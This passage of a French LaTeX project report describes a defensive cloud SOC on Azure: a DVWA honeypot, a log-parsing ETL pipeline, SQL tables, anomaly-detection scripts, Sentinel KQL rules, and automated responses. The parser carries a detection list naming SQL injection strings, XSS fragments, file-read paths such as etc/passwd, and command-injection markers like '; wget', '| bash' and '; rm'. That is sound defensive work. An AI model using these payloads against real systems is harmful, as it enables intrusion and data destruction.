+Le pipeline suit le pattern ETL : \textbf{Extract} pour extraire les logs Apache, SSH et Suricata, \textbf{Transform} pour normaliser et classifier les événements, et \textbf{Load} pour insérer les données dans Azure SQL Database.
+\placeholderfigure{6.5}{Architecture du pipeline de collecte}
+
+\subsection{Extrait du Script de collecte}
+\begin{lstlisting}[style=bashstyle, caption={collect\_logs.sh}]
+#!/bin/bash
+set -euo pipefail
+
+source /home/adminuser/.env
+DAY=$(date +%Y-%m-%d)
+REPORT_DIR="/home/adminuser/logs/$DAY"
+mkdir -p "$REPORT_DIR"
+
+DVWA_CONTAINER=$(docker ps --format "{{.Names}}" | grep -i dvwa | head -1 || true)
+if [ -z "$DVWA_CONTAINER" ]; then
+  echo "DVWA not running"
+  exit 0
+fi
+
+docker cp "$DVWA_CONTAINER:/var/log/apache2/access.log" "$REPORT_DIR/apache_access.log"
+cp /var/log/auth.log "$REPORT_DIR/auth.log"
+cp /var/log/suricata/eve.json "$REPORT_DIR/eve.json"
+python3 /home/adminuser/scripts/parse_logs.py "$REPORT_DIR"
+\end{lstlisting}
+
+\subsection{Extrait du Script parse\_logs.py}
+\begin{lstlisting}[style=pythonstyle, caption={parse\_logs.py}]
+#!/usr/bin/env python3
+import sys
+import re
+import pyodbc
+from datetime import datetime
+
+ATTACK_PATTERNS = {
+    "SQLi": ["UNION SELECT", "SELECT * FROM", "DROP TABLE", "' OR '1'='1"],
+    "XSS": ["<script>", "alert(", "onerror=", "onload="],
+    "LFI": ["../../", "etc/passwd", "/proc/self/environ"],
+    "RCE": ["; wget", "; curl", "| bash", "| sh"],
+    "CMDI": ["; rm", "; mkdir", "; chmod"]
+}
+
+def classify_attack(url, user_agent):
+    candidate = f"{url} {user_agent}".lower()
+    for attack_type, patterns in ATTACK_PATTERNS.items():
+        if any(pattern.lower() in candidate for pattern in patterns):
+            return attack_type
+    return "Unknown"
+
+def parse_apache_line(line):
+    pattern = r'(?P<ip>\S+) .* "(?P<method>\S+) (?P<url>\S+) .*" (?P<status>\d+) .* "(?P<ua>.*)"'
+    return re.search(pattern, line)
+\end{lstlisting}
+
+\subsection{Extrait du Modèle de données SQL --- DDL}
+\begin{lstlisting}[style=sqlstyle, caption={DDL Azure SQL}]
+CREATE TABLE SSHAttacks (
+    id INT IDENTITY(1,1) PRIMARY KEY,
+    attack_date DATE NOT NULL,
+    attack_time DATETIME NOT NULL,
+    attacker_ip VARCHAR(45) NOT NULL,
+    username_tried VARCHAR(100),
+    attack_result VARCHAR(20)
+);
+
+CREATE TABLE WebAttacks (
+    id INT IDENTITY(1,1) PRIMARY KEY,
+    attack_date DATE NOT NULL,
+    attack_time DATETIME NOT NULL DEFAULT GETDATE(),
+    attacker_ip VARCHAR(45) NOT NULL,
+    attack_type VARCHAR(50) NOT NULL,
+    url_path VARCHAR(500),
+    http_method VARCHAR(10),
+    status_code INT,
+    user_agent VARCHAR(500)
+);
+
+CREATE TABLE PacketLogs (
+    id INT IDENTITY(1,1) PRIMARY KEY,
+    timestamp DATETIME NOT NULL,
+    src_ip VARCHAR(45),
+    dest_ip VARCHAR(45),
+    src_port INT,
+    dest_port INT,
+    protocol VARCHAR(10),
+    alert_signature VARCHAR(500),
+    alert_severity VARCHAR(10)
+);
+
+CREATE TABLE MLAnomalies (
+    id INT IDENTITY(1,1) PRIMARY KEY,
+    detected_at DATETIME NOT NULL DEFAULT GETDATE(),
+    anomaly_score FLOAT,
+    anomaly_label VARCHAR(50),
+    model_used VARCHAR(50),
+    source_ip VARCHAR(45),
+    details VARCHAR(1000)
+);
+\end{lstlisting}
+\placeholderfigure{6.6}{Modèle de données SQL}
+
+\section{Intelligence Artificielle --- Détection d'Anomalies}
+\subsection{Fondements théoriques}
+Isolation Forest isole les anomalies par partitionnement récursif. Son score peut être exprimé par :
+\[
+s(x,n)=2^{-\frac{E(h(x))}{c(n)}}
+\]
+où $E(h(x))$ représente la longueur moyenne du chemin d'isolement. DBSCAN regroupe les points selon leur densité et identifie les points isolés comme anomalies.
+
+\subsection{VM2 --- Configuration ML}
+\begin{table}[H]
+\centering
+\caption{Paramètres de VM2}
+\label{tab:vm2}
+\small
+\begin{tabularx}{\textwidth}{|L{4cm}|Y|}
+\hline
+\theadcell{Paramètre} & \theadcell{Valeur} \\
+\hline
+Type & Standard B2s \\ \hline
+OS & Ubuntu 22.04 LTS \\ \hline
+IP & 10.10.2.40, sans IP publique \\ \hline
+Accès & VPN Hub ou jump box \\ \hline
+Runtime & Python 3.10, scikit-learn, pandas \\ \hline
+Fréquence & Exécution horaire via cron \\ \hline
+\end{tabularx}
+\end{table}
+
+\subsection{Extrait du Script ML}
+\begin{lstlisting}[style=pythonstyle, caption={Script ML Isolation Forest et DBSCAN}]
+#!/usr/bin/env python3
+import pandas as pd
+import pyodbc
+from sklearn.ensemble import IsolationForest
+from sklearn.cluster import DBSCAN
+from sklearn.preprocessing import StandardScaler
+
+conn = pyodbc.connect("DRIVER={ODBC Driver 17 for SQL Server};SERVER=server;DATABASE=AttackLogsDB;UID=user;PWD=pass;Encrypt=yes")
+
+ssh_df = pd.read_sql("""
+SELECT attacker_ip,
+       COUNT(*) AS attempt_count,
+       COUNT(DISTINCT username_tried) AS unique_users,
+       DATEPART(HOUR, attack_time) AS hour_of_day
+FROM SSHAttacks
+WHERE attack_date >= DATEADD(day,-7,GETDATE())
+GROUP BY attacker_ip, DATEPART(HOUR, attack_time)
+""", conn)
+
+features = ["attempt_count", "unique_users", "hour_of_day"]
+X = StandardScaler().fit_transform(ssh_df[features])
+
+iforest = IsolationForest(contamination=0.1, random_state=42, n_estimators=100)
+ssh_df["iforest_label"] = iforest.fit_predict(X)
+
+dbscan = DBSCAN(eps=0.5, min_samples=5)
+ssh_df["dbscan_label"] = dbscan.fit_predict(X)
+
+anomalies = ssh_df[(ssh_df["iforest_label"] == -1) | (ssh_df["dbscan_label"] == -1)]
+print(anomalies)
+\end{lstlisting}
+
+\section{SIEM --- Microsoft Sentinel}
+\subsection{Architecture et intégration}
+Microsoft Sentinel est intégré à un Log Analytics Workspace dédié. Les Data Collection Rules collectent les journaux système et sécurité depuis VM1 et les rendent exploitables par des requêtes KQL.
+\placeholderfigure{6.7}{Data Collection Rule dans Sentinel}
+
+\subsection{Règles d'alerte KQL}
+\begin{lstlisting}[style=bashstyle, caption={KQL SSH Brute Force}]
+Syslog
+| where Facility == "auth"
+| where SyslogMessage contains "Invalid user" or SyslogMessage contains "Failed password"
+| extend AttackerIP = extract(@"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", 1, SyslogMessage)
+| summarize AttemptCount=count(), UniqueUsers=dcount(extract(@"Invalid user (\w+)", 1, SyslogMessage))
+  by AttackerIP, bin(TimeGenerated, 5m)
+| where AttemptCount > 10
+\end{lstlisting}
+\placeholderfigure{6.8}{Règle KQL --- SSH Brute Force}
+
+\begin{lstlisting}[style=bashstyle, caption={KQL Mozi Botnet}]
+Syslog
+| where SyslogMessage contains "Mozi" or SyslogMessage contains "wget" or SyslogMessage contains "setup.cgi"
+| summarize Count=count() by Computer, bin(TimeGenerated, 5m)
+| where Count > 3
+\end{lstlisting}
+
+\section{SOAR --- Réponse Automatique aux Incidents}
+\subsection{Architecture Logic Apps}
+Les Logic Apps sont déclenchées par les incidents Sentinel. Le workflow extrait l'adresse IP, identifie le type d'incident, puis applique une action automatique : blocage NSG, alerte mail ou désallocation de VM selon la sévérité.
+\placeholderfigure{6.9}{Workflow Logic App SOAR}
+
+\subsection{Tableau de réponses SOAR}
+\begin{table}[H]
+\centering
+\caption{Tableau de réponses SOAR}
+\label{tab:soar}
+\small
+\begin{tabularx}{\textwidth}{|L{3cm}|Y|L{2.5cm}|}
+\hline
+\theadcell{Type incident} & \theadcell{Actions automatiques} & \theadcell{Délai estimé} \\
+\hline
+RCE & Blocage IP + désallocation VM. & $<$ 30s \\ \hline
+CMDI & Blocage IP + désallocation VM. & $<$ 30s \\ \hline
+SQLi & Blocage IP + email. & $<$ 30s \\ \hline
+Bruteforce & Blocage IP + email. & $<$ 30s \\ \hline
+SSH & Blocage IP. & $<$ 30s \\ \hline
+LFI & Blocage IP. & $<$ 30s \\ \hline
+XSS & Log uniquement. & N/A \\ \hline
+\end{tabularx}
+\end{table}
+
+\section{Visualisation --- Power BI}
+\subsection{Connexion et configuration}
+\begin{table}[H]
+\centering
+\caption{Paramètres de connexion Power BI}
+\label{tab:powerbi}
+\small
+\begin{tabularx}{\textwidth}{|L{4cm}|Y|}
+\hline
+\theadcell{Paramètre} & \theadcell{Valeur} \\
+\hline
+Serveur & \code{aitdr-sql-server.database.windows.net} \\ \hline
+Base de données & \code{AttackLogsDB} \\ \hline
+Mode & DirectQuery \\ \hline
+Authentification & Compte SQL \\ \hline
+Actualisation & Manuelle ou planifiée \\ \hline
+\end{tabularx}
+\end{table}
+
+\subsection{Mesures DAX significatives}
+\begin{lstlisting}[style=sqlstyle, caption={Mesures DAX}]
+TotalSSHAttacks = COUNTROWS(SSHAttacks)
+
+UniqueAttackers = DISTINCTCOUNT(SSHAttacks[attacker_ip])
+
+TopAttacker =
+FIRSTNONBLANK(
+    TOPN(1,
+        SUMMARIZE(SSHAttacks, SSHAttacks[attacker_ip], "count", COUNTROWS(SSHAttacks)),
+        [count], DESC),
+    1
+)
+
+SeverityHighCount =
+CALCULATE(COUNTROWS(SSHAttacks), SSHAttacks[attack_result] = "Failed")
+\end{lstlisting}
+\placeholderfigure{6.10}{Tableau de bord Power BI}
+
+\section{Conclusion du Chapitre 6}
+Ce chapitre a présenté la réalisation technique de la solution AITDR. L'infrastructure Azure est déployée avec Terraform, le honeypot DVWA capture des attaques, Suricata enrichit les logs réseau et le pipeline ETL stocke les données dans SQL. Sentinel centralise les événements, Logic Apps automatise la réponse et Power BI assure la visualisation. L'ensemble démontre la faisabilité opérationnelle d'une plateforme SOC cloud-native.
+
+% ============================================
+% CONCLUSION GÉNÉRALE
+% ============================================
+\chapter*{Conclusion générale}
+\addcontentsline{toc}{chapter}{Conclusion générale}
+
+Le projet AITDR a permis de réaliser huit livrables majeurs : une infrastructure Azure segmentée, un honeypot DVWA, un pipeline ETL, une base Azure SQL, un SIEM Microsoft Sentinel, des Logic Apps SOAR, des modèles ML d'anomalies et des tableaux de bord Power BI. Ces réalisations démontrent la capacité à construire une plateforme SOC complète dans un contexte budgétaire limité.
+
+Les compétences acquises couvrent l'architecture Cloud Azure, Terraform, la cybersécurité défensive, Suricata, l'administration Linux, Microsoft Sentinel, Azure Logic Apps, Python, le Machine Learning et Power BI. Le projet a également renforcé les compétences en gestion de projet, documentation technique et optimisation des coûts cloud.
+
+Les perspectives d'évolution concernent le court terme avec la finalisation des playbooks SOAR et la calibration ML, le moyen terme avec l'intégration de Threat Intelligence, de Sigma et de Zeek, puis le long terme avec le multi-honeypot, Kubernetes et l'intégration de LLM pour les rapports d'incident.
+
+AITDR présente une valeur professionnelle importante, car il montre qu'une solution SOC cloud-native peut être conçue avec rigueur, automatisée et maintenue dans un budget de 100 USD. Le projet constitue une base solide pour des usages pédagogiques, expérimentaux et potentiellement professionnels.
+
+% ============================================
+% BIBLIOGRAPHIE
+% ============================================
+\chapter*{Bibliographie et Nétographie}
+\addcontentsline{toc}{chapter}{Bibliographie et Nétographie}
+\begin{enumerate}
+  \item Microsoft Corporation. \textit{Microsoft Azure Documentation}. \url{https://docs.microsoft.com/azure}
+  \item HashiCorp. \textit{Terraform Documentation}. \url{https://developer.hashicorp.com/terraform/docs}
+  \item Microsoft Corporation. \textit{Microsoft Sentinel Documentation}. \url{https://docs.microsoft.com/sentinel}
+  \item Suricata Project. \textit{Suricata IDS Documentation}. \url{https://suricata.readthedocs.io/}
+  \item Scikit-learn Developers. \textit{Scikit-learn Documentation}. \url{https://scikit-learn.org/stable/}
+  \item Microsoft Corporation. \textit{Power BI Documentation}. \url{https://docs.microsoft.com/power-bi}
+  \item ANRT. \textit{Observatoire de l'économie numérique}. \url{https://www.anrt.ma/observatoire}
+  \item CNDP. \textit{Protection des données personnelles}. \url{https://www.cndp.ma/}
+  \item OWASP Foundation. \textit{OWASP Top 10}. \url{https://owasp.org/Top10/}
+  \item MITRE Corporation. \textit{MITRE ATT\&CK Framework}. \url{https://attack.mitre.org/}
+\end{enumerate}
+
+% ============================================
+% ANNEXES
+% ============================================
+\appendix
+\chapter{Technologies Utilisées}
+\begin{longtable}{|L{4cm}|L{10.5cm}|}
+\caption{Technologies utilisées par catégorie}\\
+\hline
+\theadcell{Catégorie} & \theadcell{Technologies} \\
+\hline
+\endfirsthead
+\hline
+\theadcell{Catégorie} & \theadcell{Technologies} \\
+\hline
+\endhead
+Infrastructure & Microsoft Azure, Terraform, ARM Templates, VNet, NSG, VPN Gateway. \\ \hline
+Machines virtuelles & Ubuntu 22.04 LTS, cloud-init, systemd, Docker CE. \\ \hline
+Honeypot & DVWA, MySQL 5.7, Suricata, Fail2ban. \\ \hline
+Sécurité & Key Vault, Managed Identity, RBAC, SSH, TLS. \\ \hline
+Données & Azure SQL Database, Blob Storage, pyodbc. \\ \hline
+SIEM/SOAR & Microsoft Sentinel, KQL, Logic Apps, Azure Monitor Agent. \\ \hline
+Machine Learning & Python, scikit-learn, Isolation Forest, DBSCAN, pandas. \\ \hline
+\end{longtable}
+
+\chapter{Glossaire}
+\begin{longtable}{|L{4cm}|L{10.5cm}|}
+\caption{Glossaire}\\
+\hline
+\theadcell{Terme} & \theadcell{Définition} \\
+\hline
+\endfirsthead
+\hline
+\theadcell{Terme} & \theadcell{Définition} \\
+\hline
+\endhead
+Alert fatigue & Surcharge d'alertes qui diminue l'efficacité de l'analyse. \\ \hline
+APT & Menace persistante avancée. \\ \hline
+Bootstrap & Script d'initialisation d'une machine. \\ \hline
+DBSCAN & Algorithme de clustering basé sur la densité. \\ \hline
+Defense in depth & Défense en profondeur multicouche. \\ \hline
+EVE JSON & Format de logs produit par Suricata. \\ \hline
+Honeypot & Système volontairement exposé pour attirer les attaquants. \\ \hline
+Hub-and-Spoke & Topologie réseau centralisée autour d'un hub. \\ \hline
+IMDS & Azure Instance Metadata Service. \\ \hline
+Isolation Forest & Algorithme de détection d'anomalies. \\ \hline
+Jump box & Machine relais d'administration. \\ \hline
+Managed Identity & Identité Azure gérée sans secret statique. \\ \hline
+MTTD & Mean Time To Detect. \\ \hline
+MTTC & Mean Time To Contain. \\ \hline
+Zero Trust & Modèle de sécurité sans confiance implicite. \\ \hline
+\end{longtable}
+
+\chapter{Extrait du code Terraform complet}
+Le code Terraform complet est disponible sur GitHub à l'adresse suivante :
+\url{https://github.com/oussama-gammal/aitdr-terraform}
+
+\chapter{Scripts Python de collecte et parsing}
+Les scripts Python de collecte et parsing sont disponibles sur GitHub à l'adresse suivante :
+\url{https://github.com/oussama-gammal/aitdr-scripts}
+
+\manualplaceholderfigure{13.1}{Azure Cost Management --- Coûts accumulés}
+\manualplaceholderfigure{13.2}{Microsoft Defender for Cloud --- Score de sécurité}
+\manualplaceholderfigure{13.3}{Log Analytics --- Requête KQL}
+
+\addcontentsline{lot}{table}{Tableau 6.1 : Stratégies d'optimisation des coûts}
+\addcontentsline{lot}{table}{Tableau 7.1 : Attaques réelles capturées --- Timeline}
+\addcontentsline{lot}{table}{Tableau 7.2 : Statistiques globales des attaques}
+
+\end{document}
